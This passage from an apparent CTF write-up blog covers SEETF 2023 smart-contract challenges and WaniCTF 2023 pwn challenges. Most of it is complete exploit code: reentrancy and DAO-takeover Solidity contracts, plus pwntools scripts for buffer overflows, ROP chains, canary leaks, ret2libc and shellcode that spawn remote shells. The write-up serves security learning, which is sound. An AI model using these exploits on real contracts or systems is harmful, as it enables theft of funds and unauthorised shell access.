function setAllowance() public { bank.flashLoan(address(peth), abi.encodeCall( peth.approve, (address(this), type(uint256).max) ), 0); } function attack() public payable { for (uint i = 0; i \u003c 278; i++) { bank.deposit{value: 9 ether}(); bank.withdrawAll(); } stopAttack = true; peth.transferFrom(address(peth), address(this), 2500 ether); bank.withdrawAll(); (bool success, ) = msg.sender.call{value: 2500 ether}(\"\"); require(success, \"Address: unable to send value, recipient may have reverted\"); } receive() external payable { if (!stopAttack) { peth.transfer(address(peth), msg.value); } } } Solver from web3 import Web3 from pwn import * from solcx import compile_files url = 'win.the.seetf.sg' port = 8550 def launch_instance(): print('Launch instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'1') r.recvuntil(b'uuid: ') uuid = r.recvline().strip() r.recvuntil(b'rpc endpoint: ') rpc_endpoint = r.recvline().strip() r.recvuntil(b'private key: ') private_key = r.recvline().strip() r.recvuntil(b'setup contract: ') setup_address = r.recvline().strip() r.close() print(f'uuid = {uuid}') print(f'rpc_endpoint = \\'{rpc_endpoint.decode()}\\'') print(f'private_key = \\'{private_key.decode()}\\'') print(f'setup_address = \\'{setup_address.decode()}\\'') return uuid, rpc_endpoint.decode(), private_key.decode(), setup_address.decode() def kill_instance(uuid): print('Kill instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'2') r.sendlineafter(b'uuid please: ', uuid) r.close() def get_flag(uuid): print('Get Flag...') r = remote(url, port) r.sendlineafter(b'action? ', b'3') r.sendlineafter(b'uuid please: ', uuid) flag = r.readrepeat(1) r.close() return flag # Launch instance uuid = b'' # uuid = b'0ffdc839-b96f-4208-b6e7-e193af621b2a' # rpc_endpoint = 'http://win.the.seetf.sg:8549/0ffdc839-b96f-4208-b6e7-e193af621b2a' # private_key = '0xcf8daf0d42de5d51e8b32f842810a236f65024a85d02ad2188971a740b9c0c03' # setup_address = '0x8b75Fad9f3bF4384c545FF4D00789b4b804bFfe8' if uuid == b'': uuid, rpc_endpoint, private_key, setup_address = launch_instance() # Connect to the network w3 = Web3(Web3.HTTPProvider(rpc_endpoint)) assert w3.is_connected() player = w3.eth.account.from_key(private_key) info(f'Player address: {player.address}, balance: {w3.eth.get_balance(player.address)}') # Get peth address setup_abi = [{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"peth\",\"outputs\":[{\"internalType\":\"contract PETH\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pigeonBank\",\"outputs\":[{\"internalType\":\"contract PigeonBank\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}] setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi) selector = w3.keccak(text='peth()')[:4] output = w3.eth.call({ 'to': setup_address, 'data': selector.hex() }) peth_address = w3.to_checksum_address(output[12:].hex()) info(f'{peth_address = }, balance: {w3.eth.get_balance(peth_address)}') # Get pigeonBank address selector = w3.keccak(text='pigeonBank()')[:4] output = w3.eth.call({ 'to': setup_address, 'data': selector.hex() }) pigeon_bank_address = w3.to_checksum_address(output[12:].hex()) info(f'{pigeon_bank_address = }, balance: {w3.eth.get_balance(pigeon_bank_address)}') # Deploy attacker contract compiled_src = compile_files(['Attacker.sol'], output_values=['abi', 'bin'], import_remappings=['@openzeppelin/=../lib/openzeppelin-contracts/']) compiled_attacker = compiled_src['Attacker.","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:3:3","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Pigeon Vault Description rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system. Find out a way to steal his funds before he discovers any flaws in his implementation. Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/ ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:4:0","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a lot of solidity files. After skimming through some of the code, I observed that the code is trying to follow the diamonds multi facets pattern. This link explained the concept pretty well. Let’s try to check some of the important file. Setup.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import {IDiamondCut} from \"./interfaces/IDiamondCut.sol\"; import {IDiamondLoupe} from \"./interfaces/IDiamondLoupe.sol\"; import {IOwnershipFacet} from \"./interfaces/IOwnershipFacet.sol\"; import {IERC20} from \"./interfaces/IERC20.sol\"; import {DiamondCutFacet} from \"./facets/DiamondCutFacet.sol\"; import {OwnershipFacet} from \"./facets/OwnershipFacet.sol\"; import {DiamondLoupeFacet} from \"./facets/DiamondLoupeFacet.sol\"; import {FeatherCoinFacet} from \"./facets/FTCFacet.sol\"; import {DAOFacet} from \"./facets/DAOFacet.sol\"; import {PigeonVaultFacet} from \"./facets/PigeonVaultFacet.sol\"; import {PigeonDiamond} from \"./PigeonDiamond.sol\"; import {InitDiamond} from \"./InitDiamond.sol\"; contract Setup { DiamondCutFacet public diamondCutFacet; OwnershipFacet public ownershipFacet; DiamondLoupeFacet public diamondLoupeFacet; FeatherCoinFacet public ftcFacet; DAOFacet public daoFacet; PigeonVaultFacet public pigeonVaultFacet; PigeonDiamond public pigeonDiamond; InitDiamond public initDiamond; bool public claimed; constructor() payable { diamondCutFacet = new DiamondCutFacet(); ownershipFacet = new OwnershipFacet(); diamondLoupeFacet = new DiamondLoupeFacet(); ftcFacet = new FeatherCoinFacet(); daoFacet = new DAOFacet(); pigeonVaultFacet = new PigeonVaultFacet(); pigeonDiamond = new PigeonDiamond(address(this), address(diamondCutFacet)); initDiamond = new InitDiamond(); IDiamondCut.FacetCut[] memory diamondCut = new IDiamondCut.FacetCut[](5); // Setup DiamondLoupeFacet bytes4[] memory diamondLoupeSelectors = new bytes4[](5); diamondLoupeSelectors[0] = bytes4(hex\"cdffacc6\"); diamondLoupeSelectors[1] = bytes4(hex\"52ef6b2c\"); diamondLoupeSelectors[2] = bytes4(hex\"adfca15e\"); diamondLoupeSelectors[3] = bytes4(hex\"7a0ed627\"); diamondLoupeSelectors[4] = bytes4(hex\"01ffc9a7\"); diamondCut[0] = IDiamondCut.FacetCut({ facetAddress: address(diamondLoupeFacet), action: IDiamondCut.FacetCutAction.Add, functionSelectors: diamondLoupeSelectors }); // Setup OwnershipFacet bytes4[] memory ownershipFacetSelectors = new bytes4[](2); ownershipFacetSelectors[0] = bytes4(hex\"8da5cb5b\"); ownershipFacetSelectors[1] = bytes4(hex\"f2fde38b\"); diamondCut[1] = IDiamondCut.FacetCut({ facetAddress: address(ownershipFacet), action: IDiamondCut.FacetCutAction.Add, functionSelectors: ownershipFacetSelectors }); // Setup FTCFacet bytes4[] memory ftcFacetSelectors = new bytes4[](15); ftcFacetSelectors[0] = bytes4(hex\"dd62ed3e\"); ftcFacetSelectors[1] = bytes4(hex\"095ea7b3\"); ftcFacetSelectors[2] = bytes4(hex\"70a08231\"); ftcFacetSelectors[3] = bytes4(hex\"313ce567\"); ftcFacetSelectors[4] = bytes4(hex\"5c19a95c\"); ftcFacetSelectors[5] = bytes4(hex\"34940fa8\"); ftcFacetSelectors[6] = bytes4(hex\"b4b5ea57\"); ftcFacetSelectors[7] = bytes4(hex\"42061268\"); ftcFacetSelectors[8] = bytes4(hex\"782d6fe1\"); ftcFacetSelectors[9] = bytes4(hex\"40c10f19\"); ftcFacetSelectors[10] = bytes4(hex\"06fdde03\"); ftcFacetSelectors[11] = bytes4(hex\"95d89b41\"); ftcFacetSelectors[12] = bytes4(hex\"18160ddd\"); ftcFacetSelectors[13] = bytes4(hex\"a9059cbb\"); ftcFacetSelectors[14] = bytes4(hex\"23b872dd\"); diamondCut[2] = IDiamondCut.FacetCut({ facetAddress: address(ftcFacet), action: IDiamondCut.FacetCutAction.Add, functionSelectors: ftcFacetSelectors }); // Setup DAOFacet bytes4[] memory daoFacetSelectors = new bytes4[](4); daoFacetSelectors[0] = bytes4(hex\"aad6756f\"); daoFacetSelectors[1] = bytes4(hex\"0d61b519\"); daoFacetSelectors[2] = bytes4(hex\"ece40cc1\"); daoFacetSelectors[3] = bytes4(hex\"abdc14c5\"); diamondCut[3] = IDiamondCut.FacetCut({ facetAddress: address(daoFacet), action: IDiamondCut.FacetCutAction.Add, functionSelectors: daoFacetSelectors }); // ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:4:1","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Solution I noticed that there are some interesting observations that I found: In the Setup contract, we can actually call claim multiple times because they forgot to set the claimed to true during calling it. That means, our user can have all the minted token by Setup. Looking at the isUserGovernance method, the simplified logic is basically just trying to cheeck whether totalSupply \u003e= 100, which is always true. This function is called to decide whether user can submit a proposal or not. Because it always return true, that means user can always submit a proposal Looking at the castVoteBySig method, we noticed that: The call getPriorVotes was using the msg.sender instead of the signer address. This means that one user can cast multiple votes as long as they can provide any signature which is recovered to non-null address. Checking through the executeProposal code, the requirement to execute the proposal is: Proposal isn’t executed yet (A proposal can only be executed once). block.number \u003e= proposal.endBlock Looking at the challenge description, they use foundry, which will increased the block.number by 1 per 10 seconds. Because the proposal.endBlock is proposal.startBlock + 6, that means we need to wait one minute before calling the executeProposal. The proposal.forVotes is required to be more than proposal.againstVotes and more than (s.totalSupply / 10), which is around 100k votes. This can easily achieved by two bugs that we found. Either: Call claim multiple times so that our user can directly call castVoteBySig with votes larger than 100k. Or, we can also call castVoteBySig multiple times with different signature, because the votes value that was fetched was the msg.sender balance instead of the signer. I found that the multiple claim calls are easier, so I decided to go with that. Now that we know we can execute an upgrade proposal, let’s think on what we should do with it. Because the goal is to be the owner of the pigeonDiamond, we can simply deploy our FakeOwnershipFacet in the proposal. The FakeOwnershipFacet will replace the transferOwnership method so that it can be called wihout being the current owner of the diamond. After upgrading it, we can simply call the emergencyWithdraw to satisfy the required ether balance to solve the challenge. ","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:4:2","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":"Full Script Attacker.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.17; import {IDiamondCut} from \"./interfaces/IDiamondCut.sol\"; import {IDiamondLoupe} from \"./interfaces/IDiamondLoupe.sol\"; import {IOwnershipFacet} from \"./interfaces/IOwnershipFacet.sol\"; import {IERC20} from \"./interfaces/IERC20.sol\"; import {DiamondCutFacet} from \"./facets/DiamondCutFacet.sol\"; import {OwnershipFacet} from \"./facets/OwnershipFacet.sol\"; import {DiamondLoupeFacet} from \"./facets/DiamondLoupeFacet.sol\"; import {FeatherCoinFacet} from \"./facets/FTCFacet.sol\"; import {DAOFacet} from \"./facets/DAOFacet.sol\"; import {PigeonVaultFacet} from \"./facets/PigeonVaultFacet.sol\"; import {PigeonDiamond} from \"./PigeonDiamond.sol\"; import {InitDiamond} from \"./InitDiamond.sol\"; import {IERC173} from \"./interfaces/IERC173.sol\"; import {LibDiamond} from \"./libraries/LibDiamond.sol\"; import \"./Setup.sol\"; contract FakeOwnershipFacet is IERC173 { function transferOwnership(address _newOwner) external override { LibDiamond.setContractOwner(_newOwner); } function owner() external view override returns (address owner_) { owner_ = LibDiamond.contractOwner(); } } contract Attacker { address pigeonDiamond; FakeOwnershipFacet fakeOwnershipFacet; DAOFacet dao; FeatherCoinFacet ftc; Setup setup; uint256 proposalId; constructor(address _pigeonDiamond, address _setup) { pigeonDiamond = _pigeonDiamond; ftc = FeatherCoinFacet(pigeonDiamond); dao = DAOFacet(pigeonDiamond); fakeOwnershipFacet = new FakeOwnershipFacet(); setup = Setup(_setup); // Claim all FTC for (uint i=0; i\u003c100; i++) { setup.claim(); } require(ftc.balanceOf(address(this)) == 1_000_000 ether , \"Not 1mio FTC\"); ftc.delegate(address(this)); require(ftc.getCurrentVotes(address(this)) == 1_000_000 ether, \"Not 1mio votes\"); // Setup FakeOwnershipFacet bytes4[] memory ownershipFacetSelectors = new bytes4[](2); ownershipFacetSelectors[0] = bytes4(hex\"8da5cb5b\"); ownershipFacetSelectors[1] = bytes4(hex\"f2fde38b\"); IDiamondCut.FacetCut memory facetDetails = IDiamondCut.FacetCut({ facetAddress: address(fakeOwnershipFacet), action: IDiamondCut.FacetCutAction.Replace, functionSelectors: ownershipFacetSelectors }); bytes memory callData = abi.encodeCall( fakeOwnershipFacet.transferOwnership, (msg.sender) ); proposalId = dao.submitProposal(address(fakeOwnershipFacet), callData, facetDetails); } function castVote(bytes memory _sig) public { dao.castVoteBySig(proposalId, true, _sig); } function execute() public { dao.executeProposal(proposalId); require(IOwnershipFacet(pigeonDiamond).owner() == msg.sender, \"Pigeon Diamond's owner isn't msg.sender\"); } } Solver from web3 import Web3 from pwn import * from solcx import compile_files from eth_account.messages import encode_defunct url = 'win.the.seetf.sg' port = 8552 def launch_instance(): print('Launch instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'1') r.recvuntil(b'uuid: ') uuid = r.recvline().strip() r.recvuntil(b'rpc endpoint: ') rpc_endpoint = r.recvline().strip() r.recvuntil(b'private key: ') private_key = r.recvline().strip() r.recvuntil(b'setup contract: ') setup_address = r.recvline().strip() r.close() print(f'uuid = {uuid}') print(f'rpc_endpoint = \\'{rpc_endpoint.decode()}\\'') print(f'private_key = \\'{private_key.decode()}\\'') print(f'setup_address = \\'{setup_address.decode()}\\'') return uuid, rpc_endpoint.decode(), private_key.decode(), setup_address.decode() def kill_instance(uuid): print('Kill instance...') r = remote(url, port) r.sendlineafter(b'action? ', b'2') r.sendlineafter(b'uuid please: ', uuid) r.close() def get_flag(uuid): print('Get Flag...') r = remote(url, port) r.sendlineafter(b'action? ', b'3') r.sendlineafter(b'uuid please: ', uuid) flag = r.readrepeat(1) r.close() return flag # Launch instance uuid = b'' # uuid = b'3d5e6ac5-344a-4fc6-a3b5-7e81f66d7163' # rpc_endpoint = 'http://win.the.seetf.sg:8551/3d5e6ac5-344a-4fc6-a3b5-7e81f66d7163' # private_key = '0x504e560b8ab62ed68e801aab02877ef7b4af5e1fb7d2f0ff850f2dd4","date":"Jun 12, 2023","objectID":"/posts/seetf-2023/:4:3","tags":["Writeup","SEETF","smart-contract","reentrancy","diamond","facet","2023"],"title":"SEETF 2023","uri":"/posts/seetf-2023/"},{"categories":null,"content":" WaniCTF 2023 I spent some of my free time solving challenges from WaniCTF 2023 for practice. I solved all the pwn challenges, and here is a short write-up that I created for all of the pwn challenges that I solved. Pwn ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:0:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"netcat We only need to answer the math questions three times, and we will get the flag: Flag: FLAG{1375_k339_17_u9_4nd_m0v3_0n_2_7h3_n3x7!} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:1:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"only once Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003ctime.h\u003e void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); alarm(180); } int rand_gen() { return rand() % 1000; } void win() { system(\"/bin/sh\"); } int main() { init(); srand((unsigned int)time(NULL)); int x = rand_gen(), y = rand_gen(); int score = 0, chall = 1; char buf[8]; while (1) { printf(\"\\n+---------------------------------------+\\n\"); printf(\"| your score: %d, remaining %d challenges |\\n\", score, chall); printf(\"+---------------------------------------+\\n\\n\"); if (chall == 0) { printf(\"Bye!\\n\"); break; } printf(\"%3d + %3d = \", x, y); scanf(\"%8s\", buf); if (atoi(buf) == x + y) { printf(\"Cool!\\n\"); score++; } else { printf(\"Oops...\\n\"); score = 0; } if (score \u003e= 3) { printf(\"Congrats!\\n\"); win(); } x = rand_gen(); y = rand_gen(); chall--; } return 0; } The bug is there is an null-byte overflow in the scanf(\"%8s\", buf);, because buf size is 8, yet the scanf will append an extra null-byte on it, which means the total string that is being stored is 9 (and this will overwrite the chall value to 0). It only breaks if the chall is equals to 0, but due to the null-byte overflow, the chall value will be -1, which mean we won’t exit from the while loop at all. Solver script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") r = remote('only-once-pwn.wanictf.org', 9002) r.sendlineafter(b' = ', b'a'*8) for _ in range(3): out = r.recvuntil(b' = ').strip()[:-2].split(b'\\n')[-1] ans = str(eval(out)).encode() print(f'{out} {ans}') r.sendline(ans) r.interactive() Flag: FLAG{y0u_4r3_600d_47_c41cu14710n5!} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:2:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"ret2win Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define BUF_SIZE 32 #define MAX_READ_LEN 48 void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); alarm(180); } void show_stack(char *buf) { printf(\"\\n #############################################\\n\"); printf(\" # stack state #\\n\"); printf(\" #############################################\\n\\n\"); printf(\" hex string\\n\"); for (int i = 0; i \u003c MAX_READ_LEN; i += 8) { printf(\" +--------------------+----------+\\n\"); printf(\" +0x%02x | 0x%016lx | \", i, *(unsigned long *)(buf + i)); for (int j = 7; j \u003e -1; j--) { char c = *(char *)(buf + i + j); if (c \u003e 0x7e || c \u003c 0x20) c = '.'; printf(\"%c\", c); } if (i == 40) printf(\" | \u003c- TARGET!!!\\n\"); else printf(\" |\\n\"); } printf(\" +--------------------+----------+\\n\"); } void win() { asm(\"xor %rax, %rax\\n\" \"xor %rsi, %rsi\\n\" \"xor %rdx, %rdx\\n\" \"mov $0x3b, %al\\n\" \"mov $0x68732f6e69622f, %rdi\\n\" \"push %rdi\\n\" \"mov %rsp, %rdi\\n\" \"syscall\"); } int ofs = 0, ret = 0; int main() { init(); char buf[BUF_SIZE] = {0}; printf(\"Let's overwrite the target address with that of the win function!\\n\"); while (ofs \u003c MAX_READ_LEN) { show_stack(buf); printf(\"your input (max. %d bytes) \u003e \", MAX_READ_LEN - ofs); ret = read(0, buf + ofs, MAX_READ_LEN - ofs); if (ret \u003c 0) return 1; ofs += ret; } return 0; } There is buffer overflow in the buf variable. We just need to overwrite the RIP to win. Solver script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") r = remote(b'ret2win-pwn.wanictf.org', 9003) exe = ELF('./chall') payload = b'a'*32 + p64(exe.bss()+0x100) + p64(exe.symbols['win']) r.sendlineafter(b' \u003e ', payload) r.interactive() Flag: FLAG{f1r57_5739_45_4_9wn3r} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:3:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"shellcode_basic Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e int main() { char code[1024]; printf(\"Enter shellcode: \"); fgets(code, sizeof(code), stdin); void (*shellcode)() = (void (*)())code; shellcode(); return 0; } The task was to generate any shellcode. Solver script: from pwn import * pc = remote('shell-basic-pwn.wanictf.org', 9004) context.arch = 'amd64' shell_code = asm(shellcraft.sh()) pc.sendline(shell_code) pc.interactive() Flag: FLAG{NXbit_Blocks_shellcode_next_step_is_ROP} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:4:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"beginners ROP Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define BUF_SIZE 32 #define MAX_READ_LEN 96 void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); alarm(180); } void show_stack(char *buf) { printf(\"\\n #############################################\\n\"); printf(\" # stack state #\\n\"); printf(\" #############################################\\n\\n\"); printf(\" hex string\\n\"); for (int i = 0; i \u003c MAX_READ_LEN; i += 8) { printf(\" +--------------------+----------+\\n\"); printf(\" +0x%02x | 0x%016lx | \", i, *(unsigned long *)(buf + i)); for (int j = 7; j \u003e -1; j--) { char c = *(char *)(buf + i + j); if (c \u003e 0x7e || c \u003c 0x20) c = '.'; printf(\"%c\", c); } if (i == 40) printf(\" | \u003c- TARGET!!!\\n\"); else printf(\" |\\n\"); } printf(\" +--------------------+----------+\\n\"); } void pop_rax_ret() { asm(\"pop %rax; ret\"); } void xor_rsi_ret() { asm(\"xor %rsi, %rsi; ret\"); } void xor_rdx_ret() { asm(\"xor %rdx, %rdx; ret\"); } void mov_rsp_rdi_pop_ret() { asm(\"mov %rsp, %rdi\\n\" \"add $0x8, %rsp\\n\" \"ret\"); } void syscall_ret() { asm(\"syscall; ret\"); } int ofs = 0, ret = 0; int main() { init(); char buf[BUF_SIZE] = {0}; printf(\"Let's practice ROP attack!\\n\"); while (ofs \u003c MAX_READ_LEN) { show_stack(buf); printf(\"your input (max. %d bytes) \u003e \", MAX_READ_LEN - ofs); ret = read(0, buf + ofs, MAX_READ_LEN - ofs); if (ret \u003c 0) return 1; ofs += ret; } return 0; } There is buffer overflow bug, but now we need to do ROP. Luckily, the binary has a lot of useful gadgets that we can use (We don’t need leak because the binary is No PIE). Generate a ROP Chain to call execve(\"/bin/sh\"). Solver script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF('./chall') r = remote('beginners-rop-pwn.wanictf.org', 9005) pop_rax = 0x0000000000401371 xor_rsi = 0x000000000040137e xor_rdx = 0x000000000040138d syscall = 0x00000000004013af mov_rdi_rsp = 0x000000000040139c payload = b'a'*32 payload += p64(exe.bss()+0x100) payload += p64(xor_rsi) payload += p64(xor_rdx) payload += p64(pop_rax) + p64(0x3b) payload += p64(mov_rdi_rsp) + b'/bin/sh\\x00' payload += p64(syscall) r.sendlineafter(b' \u003e ', payload) r.interactive() Flag: FLAG{h0p_p0p_r0p_po909090p93r!!!!} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:5:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"Canaleak Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void init() { // alarm(600); setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void win() { system(\"/bin/sh\"); } int main() { char nope[20]; init(); while (strcmp(nope, \"YES\")) { printf(\"You can't overwrite return address if canary is enabled.\\nDo you \" \"agree with me? : \"); scanf(\"%s\", nope); printf(nope); } } There is buffer overflow in scanf(\"%s\", nope); and format string attack in printf(nope). The binary has a canary, so what we need to do: Leak canary with format string attack With the buffer overflow, overwrite RIP to win. Solver script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF('./chall') r = remote(b'canaleak-pwn.wanictf.org', 9006) payload = b'%9$p' r.sendlineafter(b'? : ', payload) canary = int(r.recvline().strip(), 16) payload = b'YES\\x00' + b'a'*0x14 + p64(canary) + p64(exe.bss()+0x100) +p64(0x000000000040101a) + p64(exe.symbols['win']) r.sendlineafter(b'? : ', payload) r.interactive() Flag: FLAG{N0PE!} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:6:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"ret2libc Below is the source code of the challenge: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define BUF_SIZE 32 #define MAX_READ_LEN 128 void init() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); alarm(180); } void show_stack(char *buf) { printf(\"\\n #############################################\\n\"); printf(\" # stack state #\\n\"); printf(\" #############################################\\n\\n\"); printf(\" hex string\\n\"); for (int i = 0; i \u003c MAX_READ_LEN; i += 8) { printf(\" +--------------------+----------+\\n\"); printf(\" +0x%02x | 0x%016lx | \", i, *(unsigned long *)(buf + i)); for (int j = 7; j \u003e -1; j--) { char c = *(char *)(buf + i + j); if (c \u003e 0x7e || c \u003c 0x20) c = '.'; printf(\"%c\", c); } if (i == 40) printf(\" | \u003c- TARGET!!!\\n\"); else printf(\" |\\n\"); } printf(\" +--------------------+----------+\\n\"); } int ofs = 0, ret = 0; int main() { init(); char buf[BUF_SIZE] = {0}; printf(\"Can you master ROP?\\n\"); while (ofs \u003c MAX_READ_LEN) { show_stack(buf); printf(\"your input (max. %d bytes) \u003e \", MAX_READ_LEN - ofs); ret = read(0, buf + ofs, MAX_READ_LEN - ofs); if (ret \u003c 0) return 1; ofs += ret; } return 0; } There is buffer overflow bug, but there isn’t any win function. So the goal is to spawn a shell. Luckily, there is the show_stack feature, which mean we will get a libc leak. What we need to do is spawn a shell with one_gadget based on the given leak. Solver script: from pwn import * exe = ELF(\"./chall_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"ret2libc-pwn.wanictf.org\" remote_port = 9007 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() r.recvuntil(b'+0x28 | ') libc_leak = int(r.recvuntil(b' ').strip(), 16) libc.address = libc_leak - (libc.symbols['__libc_start_call_main']+128) print(f'libc base: {hex(libc.address)}') pop_rdx_r12 = libc.address + 0x000000000011f497 pop_rsi = libc.address + 0x000000000002be51 one_gadget = libc.address + 0xebcf8 # rsi == null, rdx == null payload = b'a'*32 + p64(exe.bss()+0x200) payload += p64(pop_rsi) + p64(0) payload += p64(pop_rdx_r12) + p64(0) + p64(0) payload += p64(one_gadget) r.sendlineafter(b' \u003e ', payload.ljust(128, b'\\x90')) r.interactive() Flag: FLAG{c0n6r475_0n_6r4du471n6_45_4_9wn_b361nn3r!} ","date":"May 06, 2023","objectID":"/posts/wanictf-2023/:7:0","tags":["Writeup","WanitCTF","shellcoding","ROP","heap","type confusion"],"title":"WaniCTF 2023","uri":"/posts/wanictf-2023/"},{"categories":null,"content":"Time Table Below is the source code of the challenge: chall.c #include \"utils.h\" #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e comma timetable[5][5]; void print_mandatory_subject(); void print_elective_subject(); void register_mandatory_class(); void register_elective_class(); void print_class_detail(); void write_memo(); void print_menu(); student register_student(); student user; int main() { init(); user = register_student(); int i; while (1) { print_table(timetable); print_menu(); scanf(\"%d\", \u0026i); switch (i) { case 1: register_mandatory_class(); break; case 2: register_elective_class(); break; case 3: print_class_detail(); break; case 4: write_memo(); break; case 5: exit(0); break; default: printf(\"invalid input\\n\"); } } } void print_mandatory_subject(mandatory_subject *mandatory_subjects) { printf(\"Class Name : %s\\n\", mandatory_subjects-\u003ename); printf(\"Class Time : %s\\n\", time_to_str(mandatory_subjects-\u003etime)); printf(\"Class Target : %s \u003e \", mandatory_subjects-\u003etarget[0]); printf(\"%s \u003e \", mandatory_subjects-\u003etarget[1]); printf(\"%s \u003e \", mandatory_subjects-\u003etarget[2]); printf(\"%s \\n\", mandatory_subjects-\u003etarget[3]); printf(\"Professor : %s\\n\", mandatory_subjects-\u003eprofessor); printf(\"Short Memo : %s\\n\", mandatory_subjects-\u003ememo); } void print_elective_subject(elective_subject *elective_subjects) { printf(\"Class Name : %s\\n\", elective_subjects-\u003ename); printf(\"Class Time : %s\\n\", time_to_str(elective_subjects-\u003etime)); printf(\"Professor : %s\\n\", elective_subjects-\u003eprofessor); printf(\"Short Memo : %s\\n\", elective_subjects-\u003ememo); } void register_mandatory_class() { int i; mandatory_subject choice; print_table(timetable); printf(\"-----Mandatory Class List-----\\n\"); print_mandatory_list(); printf(\"\u003e\"); scanf(\"%d\", \u0026i); choice = mandatory_list[i]; printf(\"%d\\n\", choice.time[0]); timetable[choice.time[0]][choice.time[1]].name = choice.name; timetable[choice.time[0]][choice.time[1]].type = MANDATORY_CLASS_CODE; timetable[choice.time[0]][choice.time[1]].detail = \u0026mandatory_list[i]; } void register_elective_class() { int i; elective_subject choice; print_table(timetable); printf(\"-----Elective Class List-----\\n\"); print_elective_list(); printf(\"\u003e\"); scanf(\"%d\", \u0026i); choice = elective_list[i]; if (choice.IsAvailable(\u0026user) == 1) { 